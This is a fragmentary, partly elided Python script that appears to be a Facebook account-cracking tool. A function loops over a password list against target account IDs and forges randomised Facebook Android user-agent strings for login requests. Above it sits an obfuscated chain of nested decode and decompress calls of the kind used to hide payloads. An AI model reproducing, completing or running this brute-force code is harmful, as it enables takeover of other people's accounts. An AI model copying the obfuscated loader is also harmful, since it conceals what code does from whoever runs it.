...
try:
  ...
  cc(ld(lzz(gz(un(se6(un(qp(se6(qp(un(se6(un(qp(bzz(se6(un(se6(b'==\n'))))))))))))))))))
...
def m2(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-G928N0;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-T350X;FBSV/11;FBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/TM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.%s;FBDV/CPH1613;FBSV/8;FBCA/armeabi-v7a:armeabi;]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
